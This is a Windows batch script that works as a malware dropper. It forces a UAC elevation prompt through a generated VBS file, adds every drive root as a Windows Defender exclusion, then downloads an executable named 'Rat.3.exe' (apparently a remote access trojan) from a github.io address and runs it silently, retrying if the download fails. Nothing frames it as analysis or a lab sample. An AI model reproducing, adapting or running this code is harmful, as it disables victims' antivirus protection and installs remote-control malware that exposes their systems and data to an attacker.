@echo off
color a
set "params=%*"
if exist "C:\Windows\Sab+\Sab+.sab4" (
    echo Sab+^> Killswitch detected! Cancelling.
    timeout /t 2 >nul
    exit /b
)
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~dp0"" && ""%~0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
powershell -Command "Get-PSDrive -PSProvider FileSystem | ForEach-Object { Add-MpPreference -ExclusionPath ($_.Root) -ErrorAction SilentlyContinue }"
set "url=https://sab49706.github.io/Sab4.github.io/Rat.3.exe"
set "file=Rat.3.exe"
if not exist "%file%" powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url%' -OutFile '%file%'"
echo Inditas: %file%...
start /wait "" "%file%" /VERYSILENT /SUPPRESSMSGBOXES /NORESTART /S /D=%~dp0
if not exist "%file%" (
    echo ERROR: Download failed, retrying...
    powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%file%'"
    start /wait "" "%file%" /VERYSILENT /S
)
echo Done!
pause